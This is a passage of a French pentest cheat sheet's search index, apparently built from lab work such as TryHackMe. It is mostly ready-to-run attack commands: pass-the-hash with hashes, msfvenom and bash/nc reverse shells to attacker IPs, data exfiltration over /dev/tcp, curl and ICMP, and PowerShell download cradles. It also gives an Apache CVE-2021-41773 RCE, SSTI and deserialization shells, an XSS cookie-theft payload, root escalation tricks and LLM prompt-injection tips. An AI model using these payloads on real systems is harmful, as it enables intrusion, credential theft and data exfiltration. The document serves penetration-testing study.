./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" --cleanup"},{"id":"pass-the-hash-pth","u":"05_ti-interne.html#pass-the-hash-pth","sec":"TI interne","lvl":2,"t":"Pass the Hash (PtH)","c":"# Si connexion directe impossible, essayer C$ impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36 administrator@10.1.78.141 # Changer le mot de passe admin via nxc nxc smb 10.1.217.65 -u administrator -H '<redacted>' --local-auth --exec-method=smbexec -X 'net user administrator Password123!'"},{"id":"psexec","u":"05_ti-interne.html#psexec","sec":"TI interne","lvl":2,"t":"PSExec","c":"impacket-psexec administrator@10.0.30.32 -hashes aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a"},{"id":"smb-sans-signature-relais","u":"05_ti-interne.html#smb-sans-signature-relais","sec":"TI interne","lvl":2,"t":"SMB sans signature (relais)","c":"nxc smb targets.txt --gen-relay-list nosigning.txt"},{"id":"ntlm-theft","u":"05_ti-interne.html#ntlm-theft","sec":"TI interne","lvl":2,"t":"NTLM theft","c":"# https://github.com/Greenwolf/ntlm_theft ntlm_theft.py --generate modern --server 10.200.27.253 --filename \"bob\""},{"id":"password-spraying-ntlm-http","u":"05_ti-interne.html#password-spraying-ntlm-http","sec":"TI interne","lvl":2,"t":"Password Spraying (NTLM HTTP)","c":"Script Python maison (requests_ntlm) qui pulvérise un mot de passe sur une liste d’utilisateurs : python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/"},{"id":"reverse-shell-windows-msfvenom-smb","u":"05_ti-interne.html#reverse-shell-windows-msfvenom-smb","sec":"TI interne","lvl":2,"t":"Reverse shell Windows (msfvenom + SMB)","c":"msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . copy \\\\10.10.10.10\\kali\\reverse.exe C:\\PrivEsc\\reverse.exe sudo nc -nvlp 53"},{"id":"exfiltration-canaux-variés","u":"05_ti-interne.html#exfiltration-canaux-variés","sec":"TI interne","lvl":2,"t":"Exfiltration (canaux variés)","c":"# TCP socket tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 # SSH tar cf - task5/ | ssh thm@jump.thm.com \"cd /tmp/; tar xpf -\" # HTTP curl --data \"file=$(tar zcf - task6 | base64)\" http://web.thm.com/contact.php # ICMP (metasploit auxiliary/server/icmp_exfil) ping 10.10.77.97 -c 1 -p 74686d3a7472796861636b6d650a"},{"id":"évasion-av-powercat-download-cradle","u":"05_ti-interne.html#évasion-av-powercat-download-cradle","sec":"TI interne","lvl":2,"t":"Évasion AV (powercat / download-cradle)","c":"pwsh -c \"iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge\" > /home/$rshell # ex.bat START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.8.211.1:9000/shell-49731.txt');iex 'powershell -E $code'"},{"id":"génération-de-listes-dutilisateurs","u":"05_ti-interne.html#génération-de-listes-dutilisateurs","sec":"TI interne","lvl":2,"t":"Génération de listes d’utilisateurs","c":"UserlistGenerator — génère des permutations de noms pour le brute-force (compatible Kerbrute)."},{"id":"windows-privesc-résumé-des-vecteurs","u":"05_ti-interne.html#windows-privesc-résumé-des-vecteurs","sec":"TI interne","lvl":2,"t":"Windows PrivEsc (résumé des vecteurs)","c":"Vecteurs classiques testés avec accesschk.exe / sc qc : Insecure Service Permissions ( SERVICE_CHANGE_CONFIG ) → sc config <svc> binpath= \"...\" Unquoted Service Path → déposer Common.exe dans un chemin non quoté Weak Registry Permissions → écraser ImagePath du service Insecure Service Executables → remplacer le binaire du service AutoRuns modifiables, AlwaysInstallElevated ( msiexec /i reverse.msi ) Passwords dans le registre / creds sauvegardés ( cmdkey /list , runas /savecred ) SAM/SYSTEM dans C:\\Windows\\Repair\\ → creddump7 puis crack Hashcat Pass-the-Hash ( pth-winexe ), Scheduled Tasks modifiables Token Impersonation : RoguePotato / PrintSpoofer via PSExec64.exe -i -u \"nt authority\\local service\""},{"id":"énumération","u":"06_pentest-web.html#énumération","sec":"Pentest web","lvl":2,"t":"Énumération","c":""},{"id":"répertoires","u":"06_pentest-web.html#répertoires","sec":"Pentest web","lvl":3,"t":"Répertoires","c":"ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://example.com/FUZZ dirsearch -u http://example.com/ -w /usr/share/wordlists/dirBuster_list/directory-list-2.3-small.txt gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://example.com/ seq -w 0 9999 | ffuf -w - -u http://MACHINE_IP:8080/debug/logsFUZZ"},{"id":"sous-domaines-vhosts","u":"06_pentest-web.html#sous-domaines-vhosts","sec":"Pentest web","lvl":3,"t":"Sous-domaines / VHosts","c":"ffuf -w .../directory-list-2.3-medium.txt -H \"Host: FUZZ.nahamstore.thm\" -u \"http://nahamstore.thm\" gobuster vhost -u http://example.com -w subdomains-top1million-5000.txt gobuster dns -d google.com -w ~/wordlists/subdomains.txt ./sublist3r.py -d acmeitsupport.thm subfinder -d maroc.com"},{"id":"paramètres","u":"06_pentest-web.html#paramètres","sec":"Pentest web","lvl":3,"t":"Paramètres","c":"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 400 -X POST -u \"http://10.10.3.207/api/items?FUZZ=test\""},{"id":"passwords-brute-force-form","u":"06_pentest-web.html#passwords-brute-force-form","sec":"Pentest web","lvl":3,"t":"Passwords (brute force form)","c":"ffuf -w rockyou.txt -d \"email=adminaccount@itsupport.thm&password=FUZZ\" -u http://10.10.133.75/login -fw 475 -H \"Content-Type: application/x-www-form-urlencoded\" hydra -l admin -P rockyou.txt 10.10.253.208 http-post-form \"/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid\""},{"id":"apache-2.4.49-path-traversal-rce-cve-2021-41773","u":"06_pentest-web.html#apache-2.4.49-path-traversal-rce-cve-2021-41773","sec":"Pentest web","lvl":2,"t":"Apache 2.4.49 – Path Traversal / RCE (CVE-2021-41773)","c":"# Lecture / exécution via CGI curl 'http://10.10.7.235/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' \\ -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H \"Content-Type: text/plain\" # Reverse shell curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' \\ -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.1.30/1337 0>&1' -H \"Content-Type: text/plain\""},{"id":"apache-log-poisoning-lfi-rce","u":"06_pentest-web.html#apache-log-poisoning-lfi-rce","sec":"Pentest web","lvl":3,"t":"Apache – Log Poisoning (LFI → RCE)","c":"dog/../../../../../var/log/apache2/access.log User-Agent: <?php file_put_contents(shell.php, file_get_contents(http://10.9.76.49/shell.php));?>"},{"id":"php-wrappers-lfi","u":"06_pentest-web.html#php-wrappers-lfi","sec":"Pentest web","lvl":2,"t":"PHP wrappers / LFI","c":"# Lecture source encodée base64 .../?file=php://filter/convert.base64-encode/resource=accueil.php php://filter/string.rot13/resource=.htaccess php://filter/string.toupper|tolower|strip_tags/resource=.htaccess # data:// wrapper + payload base64 -> RCE php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7...&cmd=whoami # session poisoning page=<?php echo phpinfo(); ?> puis /var/lib/php/sessions/sess_SES-ID"},{"id":"tomcat-war-reverse-shell","u":"06_pentest-web.html#tomcat-war-reverse-shell","sec":"Pentest web","lvl":2,"t":"Tomcat – WAR reverse shell","c":"wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp zip -r backup.war cmd.jsp # Déployer puis: http://tomcat-site.local:8180/backup/cmd.jsp"},{"id":"bypass-auth-brute-force","u":"06_pentest-web.html#bypass-auth-brute-force","sec":"Pentest web","lvl":2,"t":"Bypass auth – Brute force","c":"# Enumération d'utilisateurs ffuf -w names.txt -X POST -d \"username=FUZZ&email=x&password=x&cpassword=x\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://IP/customers/signup -mr \"username already exists\" # Cluster bomb user/pass ffuf -w valid_usernames.txt:W1,top-100.txt:W2 -X POST -d \"username=W1&password=W2\" -u http://IP/customers/login -fc 200 # PIN brute hydra -l '' -P 3digits.txt -f -v 10.10.172.167 http-post-form \"/login.php:pin=PASS:Access denied\" -s 8000 wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs \"Please enter the correct credentials\" -u http://10.10.81.30/login.php -d \"username=FUZZ&password=FUZ2Z\""},{"id":"cms","u":"06_pentest-web.html#cms","sec":"Pentest web","lvl":2,"t":"CMS","c":""},{"id":"joomla-sqli-3.7.0-cve-2017-8917","u":"06_pentest-web.html#joomla-sqli-3.7.0-cve-2017-8917","sec":"Pentest web","lvl":3,"t":"Joomla (SQLi 3.7.0 – CVE-2017-8917)","c":"sqlmap -u \"http://10.10.186.100/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]"},{"id":"wordpress","u":"06_pentest-web.html#wordpress","sec":"Pentest web","lvl":3,"t":"WordPress","c":"# Élévation de rôle à l'inscription &ure_other_roles=administrator # Enumération plugins nmap -p 80 --script http-wordpress-enum --script-args type=\"plugins\",search-limit=1500 127.0.0.1"},{"id":"wordpress-cve-2021-29447-xxe-via-wavmedia","u":"06_pentest-web.html#wordpress-cve-2021-29447-xxe-via-wavmedia","sec":"Pentest web","lvl":3,"t":"WordPress – CVE-2021-29447 (XXE via WAV/media)","c":"Charge WAV malveillante référençant une DTD externe ( php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd ) pour exfiltrer via un serveur PHP contrôlé."},{"id":"code-injection-payloads","u":"06_pentest-web.html#code-injection-payloads","sec":"Pentest web","lvl":2,"t":"Code injection – Payloads","c":"\".system('uname -a'); $dummy=\" // dummy code \".system('uname -a');# // via commentaire ?order=id);}system('uname%20-a'); '.system(\"ls -la\").' // dans assert()"},{"id":"ssti","u":"06_pentest-web.html#ssti","sec":"Pentest web","lvl":2,"t":"SSTI","c":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} # Jinja2 #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('bash -c \"sh -i >& /dev/tcp/10.8.8.52/1337 0>&1\"')}()} # Pug"},{"id":"sql-injection","u":"06_pentest-web.html#sql-injection","sec":"Pentest web","lvl":2,"t":"SQL Injection","c":""},{"id":"énumération-manuelle-binary-search","u":"06_pentest-web.html#énumération-manuelle-binary-search","sec":"Pentest web","lvl":3,"t":"Énumération manuelle (binary search)","c":"' union select 1,2,3,4 where database() like binary '<lettre>%'-- - ' union select 1,2,3,4 FROM information_schema.tables WHERE table_schema='mywebsite' and table_name like binary '<lettre>%'-- - ' union select 1,2,3,4 from siteusers where username like binary 'kitty' and password like binary '<lettre>%'-- -"},{"id":"sqlmap","u":"06_pentest-web.html#sqlmap","sec":"Pentest web","lvl":3,"t":"sqlmap","c":"sqlmap --url=\"http://nahamstore.thm/product?id=1\" --batch --dbms=mysql --level=5 --risk=3 -D nahamstore -T product --dump sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --file-read=/xampp/htdocs/index.php --batch sqlmap -u 192.168.1.124/sqli/Less-1.?id=1 --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch sqlmap -u 'http://hogwartz-castle.thm/login' --random-agent --method POST --data 'user=Harry&password=pass' -p user --level 5 --risk 3"},{"id":"nosql-injection","u":"06_pentest-web.html#nosql-injection","sec":"Pentest web","lvl":2,"t":"NoSQL Injection","c":"user[$ne]=xxxx&pass[$ne]=xxxx&remember=on user[$nin][]=admin&pass[$ne]=xxxx&remember=on user=john&pass&remember=on # découverte de longueur/mot de passe"},{"id":"xxe","u":"06_pentest-web.html#xxe","sec":"Pentest web","lvl":2,"t":"XXE","c":"<!DOCTYPE root[<!ENTITY file SYSTEM \"file:///etc/passwd\">]> <root><email>&file;</email></root> <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]> <svg ...><text>&xxe;</text></svg>"},{"id":"xss","u":"06_pentest-web.html#xss","sec":"Pentest web","lvl":2,"t":"XSS","c":"javascript:alert('XSS') # DOM XSS eval 1+1`${document.location=\"https://eol9dtzbk9673pb.m.pipedream.net?c=\"+document.cookie}` Liste de payloads : payloadbox/xss-payload-list . XSS via SVG également possible."},{"id":"csrf-payloads","u":"06_pentest-web.html#csrf-payloads","sec":"Pentest web","lvl":2,"t":"CSRF – Payloads","c":"Liste GET/POST (avec ou sans interaction), auto-submit, JSON GET. Voir les patrons dans la section Web Vulnerability Checklist → CSRF."},{"id":"node.js-reverse-shell-deserialization","u":"06_pentest-web.html#node.js-reverse-shell-deserialization","sec":"Pentest web","lvl":2,"t":"Node.js – Reverse shell (deserialization)","c":"# node-serialize : IIFE payload node test.js | sed 's/}\"/}()\"/g' | base64 -w0 # puis injection dans le cookie/objet sérialisé"},{"id":"php-hmac","u":"06_pentest-web.html#php-hmac","sec":"Pentest web","lvl":2,"t":"PHP – HMAC","c":"php -r \"echo hash_hmac('sha256', 'example.com', false)\" https://example.com/?nonce[]=&hmac=8e35e0a8...&host=example.com"},{"id":"docker-registry-enumération-via-curl","u":"06_pentest-web.html#docker-registry-enumération-via-curl","sec":"Pentest web","lvl":2,"t":"Docker registry – Enumération via curl","c":"curl -s http://10.10.10.10:5000/v2/_catalog curl -s http://192.251.36.3:5000/v2/ubuntu/tags/list curl -s http://192.251.36.3:5000/v2/ubuntu/manifests/latest curl http://10.10.10.10:5000/v2/ubuntu/blobs/sha256:<digest> --output blob1.tar"},{"id":"outils","u":"06_pentest-web.html#outils","sec":"Pentest web","lvl":2,"t":"Outils","c":"crunch : crunch 3 3 0123456789ABCDEF -o passwords.txt gobuster : modes dns , vhost , dir , fuzz , s3 , gcs , tftp ; patterns {GOBUSTER} ; wordlist via STDIN"},{"id":"docker-bases","u":"07_cloud-k8s.html#docker-bases","sec":"Cloud & K8s","lvl":2,"t":"Docker (bases)","c":"docker build . -t mon_image docker run -p 8080:80 nginx docker network create --driver bridge mon-bridge docker run -dit --name alpine1 --network mon-bridge alpine docker exec alpine1 ping -c 1 alpine2 # Registry local minikube eval $(minikube docker-env) docker build . --tag localhost:5000/ma_premiere_image docker push localhost:5000/ma_premiere_image curl http://localhost:5000/v2/_catalog"},{"id":"kubernetes-kube","u":"07_cloud-k8s.html#kubernetes-kube","sec":"Cloud & K8s","lvl":2,"t":"Kubernetes (Kube)","c":"kubectl whoami kubectl auth can-i --list kubectl get <ressource> <nom> -o yaml kubectl get pods crane auth x.x.x -u xxxx -p xxxx crane pull image /tmp/mg.tar"},{"id":"azure-cli-devops","u":"07_cloud-k8s.html#azure-cli-devops","sec":"Cloud & K8s","lvl":2,"t":"Azure CLI (DevOps)","c":"az devops login az pipelines list --query \"[].{name:name,id:id}\" -o table az devops security group list --project \"Pentest\" az devops security group membership list --id <GROUP_ID> -o table az devops security permission list --id \"Pipeline/<PIPELINE_ID>\" --subject \"<USER_ID>\""},{"id":"scénarios-dattaque-azure-devops-ci-cd","u":"07_cloud-k8s.html#scénarios-dattaque-azure-devops-ci-cd","sec":"Cloud & K8s","lvl":2,"t":"Scénarios d’attaque Azure DevOps / CI-CD","c":"Lire des variables cachées à travers les pipelines : injecter echo $(var) | base64 (ou rev ) dans un header curl d’un step. Attribuer des rôles sur une ressource (souscription Azure) via un pipeline privilégié : az role assignment create --assignee <ID> --role \"Contributor\" --scope \"<scope>\" Accéder à un repo secret que l’utilisateur ne peut pas lire mais le pipeline oui : curl -H \"Authorization: Bearer $(System.AccessToken)\" https://dev.azure.com/{org}/{project}/_apis/git/repositories?api-version=7.1 ou déclarer resources: repositories: - repository: secret et checkout: secret . Build validation activée → exécuter du code via pre-merge pull request. Tests non isolés pouvant modifier des fichiers de build → monter en read-only / isoler dans des conteneurs. Service connection garantie à tous les pipelines → restreindre par branch control ( allowed branches: main ). Bypass de restrictions : changer le trigger vers main (auto) ou vers une nouvelle branche pour contourner les politiques de reviewers. Solution : restrictions (checks) sur les service connections / variables et branch control. Références : Azure DevOps Privilege Escalation: Pipeline Shenanigans (Anniek van der Peijl), Azure DevOps security – Lessons learned (Björn Sundling)."},{"id":"terraform-state-file-prise-de-contrôle-pipeline-study-case","u":"07_cloud-k8s.html#terraform-state-file-prise-de-contrôle-pipeline-study-case","sec":"Cloud & K8s","lvl":2,"t":"Terraform state file → prise de contrôle pipeline (study case)","c":"Si un red teamer peut modifier uniquement le fichier terraform.state d’un bucket S3 : Suppression de ressources : insérer une ressource factice pointant vers l’ID réel à détruire, ou modifier un attribut non-updatable in place → Terraform propose de détruire/recréer. Exécution de code : publier un custom provider malveillant (fonction New() qui fait un GET vers un webhook) puis référencer ce provider dans le state ( registry.terraform.io/<user>/terrarizer ). Le code s’exécute dès terraform init , même sans apply . Mitigations : figer (pin) les providers hors pipeline (image immuable), sécuriser le state (permissions/KMS pour que seul le pipeline y écrive), activer le state locking (DynamoDB), stocker le lock dans un emplacement séparé, utiliser un rôle read-only pour terraform plan ."},{"id":"détection-de-vulnérabilités-iac-checkov-terra","u":"07_cloud-k8s.html#détection-de-vulnérabilités-iac-checkov-terra","sec":"Cloud & K8s","lvl":2,"t":"Détection de vulnérabilités IaC (Checkov / Terra)","c":"Exemples de checks Azure fréquents : Check Risque Fix CKV_AZURE_10 / 9 SSH/RDP ouverts ( source_address_prefix = \"*\" ) Restreindre à un CIDR de confiance CKV_AZURE_113 SQL server public public_network_access_enabled = false CKV_AZURE_23/24 SQL sans auditing Ajouter azurerm_mssql_server_extended_auditing_policy CKV_AZURE_3 Storage sans HTTPS enable_https_traffic_only = true CKV_AZURE_35 Storage réseau ouvert network_rules { default_action = \"Deny\" } CKV_AZURE_120 App Gateway sans WAF waf_configuration { enabled = true, firewall_mode = \"Prevention\" }"},{"id":"aks-kubernetes-managé","u":"07_cloud-k8s.html#aks-kubernetes-managé","sec":"Cloud & K8s","lvl":3,"t":"AKS (Kubernetes managé)","c":"azure_policy add-on, désactiver le dashboard, activer OMS agent (logging), chiffrement disque ( disk_encryption_set_id ), private_cluster_enabled = true , network_policy (azure/calico), api_server_authorized_ip_ranges , RBAC ( role_based_access_control { enabled = true } )."},{"id":"app-services-vm-key-vault-storage","u":"07_cloud-k8s.html#app-services-vm-key-vault-storage","sec":"Cloud & K8s","lvl":3,"t":"App Services / VM / Key Vault / Storage","c":"App Services : min_tls_version = \"1.2\" , ftps_state = \"Disabled\" , https_only = true , managed identity, auth AAD. VM : disable_password_authentication = true + admin_ssh_key , chiffrement OS disk. Key Vault : network_acls default_action = \"Deny\" , purge_protection_enabled = true , soft_delete_retention_days = 90 , clés HSM et expiration. Storage : chiffrement disque/CMK, default_action = \"Deny\" , logging queue, min_tls_version = \"TLS1_2\" ."},{"id":"llm-prompt-injection","u":"07_cloud-k8s.html#llm-prompt-injection","sec":"Cloud & K8s","lvl":2,"t":"LLM (prompt injection)","c":"Poser la même question plusieurs fois, changer les mots (password, secret). Injection de commande : ;ls , $(ls) , indirect prompt injection. XSS indirect/direct avec des \"quotes\" ."},{"id":"owasp-top-10-cicd-security-risks","u":"07_cloud-k8s.html#owasp-top-10-cicd-security-risks","sec":"Cloud & K8s","lvl":2,"t":"OWASP Top 10 CI/CD Security Risks","c":"CICD-SEC-1 Insufficient Flow Control · SEC-2 Inadequate IAM · SEC-3 Dependency Chain Abuse · SEC-4 Poisoned Pipeline Execution (PPE) · SEC-5 Insufficient PBAC · SEC-6 Insufficient Credential Hygiene · SEC-7 Insecure System Configuration · SEC-8 Ungoverned 3rd-Party Services · SEC-9 Improper Artifact Integrity Validation · SEC-10 Insufficient Logging & Visibility."},{"id":"outils-daudit-k8s-cloud","u":"07_cloud-k8s.html#outils-daudit-k8s-cloud","sec":"Cloud & K8s","lvl":2,"t":"Outils d’audit K8s / Cloud","c":"kube-bench, kube-scan, kube-hunter, Polaris, kubeaudit Chef Inspec + cis-kubernetes-benchmark rbac-police (PaloAltoNetworks) ScoutSuite : python3 scout.py Azure --cli"},{"id":"linux-privesc","u":"08_privesc-tools.html#linux-privesc","sec":"Priv escalation & Tools","lvl":2,"t":"Linux PrivEsc","c":""},{"id":"doas","u":"08_privesc-tools.html#doas","sec":"Priv escalation & Tools","lvl":3,"t":"doas","c":"# conf: /usr/local/etc/doas.conf ou /etc/doas.conf doas -u root rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/d"},{"id":"docker-socket-group","u":"08_privesc-tools.html#docker-socket-group","sec":"Priv escalation & Tools","lvl":3,"t":"Docker socket / group","c":"# Contacter un daemon Docker exposé DOCKER_HOST=tcp://$TARGET_IP:2375 docker image ls DOCKER_HOST=tcp://$TARGET_IP:2375 docker run -it -v /:/mnt/host alpine:3.9 /bin/sh cd /mnt/host/root"},{"id":"exiftool-djvu","u":"08_privesc-tools.html#exiftool-djvu","sec":"Priv escalation & Tools","lvl":3,"t":"exiftool (DjVu)","c":"Créer une charge dans un fichier exploit , la compresser ( bzz ), générer un .djvu ( djvumake ... ANTz=exploit.bzz ), puis : sudo /usr/local/bin/exiftool exploit.djvu"},{"id":"jar-sudo-java","u":"08_privesc-tools.html#jar-sudo-java","sec":"Priv escalation & Tools","lvl":3,"t":"jar (sudo java)","c":"msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f jar -o shell.jar sudo /usr/bin/java -jar /tmp/shell.jar"},{"id":"ld_preload","u":"08_privesc-tools.html#ld_preload","sec":"Priv escalation & Tools","lvl":3,"t":"LD_PRELOAD","c":"#include <stdio.h> #include <stdlib.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); } gcc -fPIC -shared -o shell.so shell.c -nostartfiles sudo LD_PRELOAD=/tmp/shell.so find"},{"id":"mysql-into-outfile-webshell","u":"08_privesc-tools.html#mysql-into-outfile-webshell","sec":"Priv escalation & Tools","lvl":3,"t":"MySQL (INTO OUTFILE → webshell)","c":"select <?php $cmd=$_GET[\"cmd\"];system($cmd);?> INTO OUTFILE '/var/www/html/shell.php';"},{"id":"tar-wildcard-injection","u":"08_privesc-tools.html#tar-wildcard-injection","sec":"Priv escalation & Tools","lvl":3,"t":"tar wildcard injection","c":"echo -e '#!/bin/bash\\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.76.49 1234 >/tmp/f' > shell.sh echo \"\" > \"--checkpoint-action=exec=sh shell.sh\" echo \"\" > --checkpoint=1"},{"id":"tools","u":"08_privesc-tools.html#tools","sec":"Priv escalation & Tools","lvl":3,"t":"Tools","c":"LinPEAS, LinEnum, LES (Linux Exploit Suggester), Linux Smart Enumeration, Linux Priv Checker."},{"id":"reverse-shells","u":"08_privesc-tools.html#reverse-shells","sec":"Priv escalation & Tools","lvl":2,"t":"Reverse shells","c":""},{"id":"python","u":"08_privesc-tools.html#python","sec":"Priv escalation & Tools","lvl":3,"t":"Python","c":"import socket, pty s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\"10.4.34.126\", 8999)) dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2) pty.spawn(\"/bin/bash\")"},{"id":"depuis-un-module-python","u":"08_privesc-tools.html#depuis-un-module-python","sec":"Priv escalation & Tools","lvl":3,"t":"Depuis un module Python","c":"from os import dup2 from subprocess import run import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\"LOCAL_IP\", 1234)) dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2) run([\"/bin/bash\",\"-i\"])"},{"id":"ssti-pug","u":"08_privesc-tools.html#ssti-pug","sec":"Priv escalation & Tools","lvl":3,"t":"SSTI PUG","c":"#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('bash -c \"sh -i >& /dev/tcp/10.8.8.52/1337 0>&1\"')}()}"},{"id":"upgrade-shell-tty","u":"08_privesc-tools.html#upgrade-shell-tty","sec":"Priv escalation & Tools","lvl":2,"t":"Upgrade shell (TTY)","c":"SHELL=/bin/bash script -q /dev/null python -c 'import pty; pty.spawn(\"/bin/bash\")' # Ctrl+Z ; stty raw -echo && fg ; reset"},{"id":"pivoting-rpivot","u":"08_privesc-tools.html#pivoting-rpivot","sec":"Priv escalation & Tools","lvl":2,"t":"Pivoting (rpivot)","c":"git clone https://github.com/klsecservices/rpivot.git # Attaquant python2 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080 # Machine initiale python client.py --server-ip 10.10.200.x --server-port 9999 # /etc/proxychains.conf : socks4 127.0.0.1 1080"},{"id":"port-knocking","u":"08_privesc-tools.html#port-knocking","sec":"Priv escalation & Tools","lvl":2,"t":"Port knocking","c":"#!/bin/bash for p in 42 1337 10420 6969 63000; do curl 10.10.44.92:$p -m 1; sleep 1; done"},{"id":"python-jail-escape","u":"08_privesc-tools.html#python-jail-escape","sec":"Priv escalation & Tools","lvl":2,"t":"Python jail escape","c":"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')"},{"id":"insecure-deserialization-php","u":"08_privesc-tools.html#insecure-deserialization-php","sec":"Priv escalation & Tools","lvl":2,"t":"Insecure deserialization (PHP)","c":"<?php class MaliciousUserData { public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh'; public function __wakeup() { exec($this->command); } } $data = base64_encode(serialize(new MaliciousUserData())); echo $data;"},{"id":"bypass-command-line-obfuscation","u":"08_privesc-tools.html#bypass-command-line-obfuscation","sec":"Priv escalation & Tools","lvl":2,"t":"Bypass command line (obfuscation)","c":"echo \"echo $(echo 'bash -i >& /dev/tcp/10.9.76.49/4444 0>&1' | base64 | base64)ba''se''6''4 -''dba''se''64 -''db''a''s''h\" | sed 's/ /$/g'"},{"id":"john-the-ripper","u":"08_privesc-tools.html#john-the-ripper","sec":"Priv escalation & Tools","lvl":2,"t":"John the Ripper","c":"gpg2john tryhackme.asc > tryhackme.asc.john john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.asc.john # Règles custom, ex: john -wordlist:base.txt -rules:TryHackMe-Intranet -stdout > wordlist.txt"},{"id":"tls","u":"08_privesc-tools.html#tls","sec":"Priv escalation & Tools","lvl":2,"t":"TLS","c":"openssl s_client -connect www-preprod.pulsy.fr:8443 -servername www-preprod.pulsy.fr"},{"id":"wayback-recon-passif","u":"08_privesc-tools.html#wayback-recon-passif","sec":"Priv escalation & Tools","lvl":2,"t":"Wayback / recon passif","c":"WaybackPDF (télécharge les PDF archivés), Wayhunt (classe les URLs par extension), urlfinder (projectdiscovery)."},{"id":"google-dorks-extraits","u":"08_privesc-tools.html#google-dorks-extraits","sec":"Priv escalation & Tools","lvl":2,"t":"Google Dorks (extraits)","c":"intitle:\"index of\" site:target.com filetype:env inurl:.env site:target.com inurl:\"/.git/config\" site:target.com intext:\"api_key\" filetype:env site:target.com filetype:bak inurl:backup site:target.com"},{"id":"boîte-à-outils-tools","u":"08_privesc-tools.html#boîte-à-outils-tools","sec":"Priv escalation & Tools","lvl":2,"t":"Boîte à outils (TOOLS)","c":"theHarvester, h8mail, FOCA, httpx, EyeWitness, Gophish + EvilNginx, dnscan, Feroxbuster, Gospider, ParamSpider, nuclei, tun2socks, bettercap, Responder, Coercer, ntlmrelayx, mitm6, Certipy, GetUserSPNs, GetNPUsers, CrackMapExec/NetExec, manspider, DonPAPI, xfreerdp, Pantagrule, psudo, ExtractBitlockerKeys, Hekatomb, pwndoc-ng."},{"id":"fa-bypass","u":"09_web-vuln-checklist.html#fa-bypass","sec":"Web Vulnerability Checklist","lvl":2,"t":"2FA Bypass","c":"Logique de vérification défaillante (cookie account=victim réutilisé à l’étape 2). Clickjacking sur la désactivation 2FA ; manipulation de réponse ( \"success\":false → true ) ou de status code (4xx → 200). Réutilisation du code 2FA ; CSRF sur la désactivation ; abus des backup codes. Absence d’expiration de session à l’activation ; bypass via header Referer ; fuite du code dans la réponse. Analyse des fichiers JS ; absence de rate-limit / brute-force ; reset email = désactivation 2FA. Réutilisation de token entre comptes ; bypass null / 000000 ; sessions précédentes toujours valides après activation MFA."},{"id":"bypass","u":"09_web-vuln-checklist.html#bypass","sec":"Web Vulnerability Checklist","lvl":2,"t":"403 Bypass","c":"Fuzz / brute force du chemin, wayback. Headers : X-Original-URL , X-Rewrite-URL , X-Forwarded-For , X-Custom-IP-Authorization: 127.0.0.1 , etc. Payloads d’URL : %2e , ..;/ , /./ , // , /%2f , ; , ? , # , encodages multiples ( %252e ). Outils : bypass-403, 4-ZERO-3, B1pass3r."},{"id":"account-takeover-ato","u":"09_web-vuln-checklist.html#account-takeover-ato","sec":"Web Vulnerability Checklist","lvl":2,"t":"Account Takeover (ATO)","c":"Pre-account takeover (même email, méthodes d’inscription différentes). Rate-limit insuffisant, exposition de données sensibles (OTP/hash dans la réponse). XSS → exfiltration cookie/token ; CSRF/IDOR sur update email/password. Response/status manipulation, crypto faible, HTTP request smuggling, CORS mal configuré, session cookie fuité."},{"id":"admin-panel","u":"09_web-vuln-checklist.html#admin-panel","sec":"Web Vulnerability 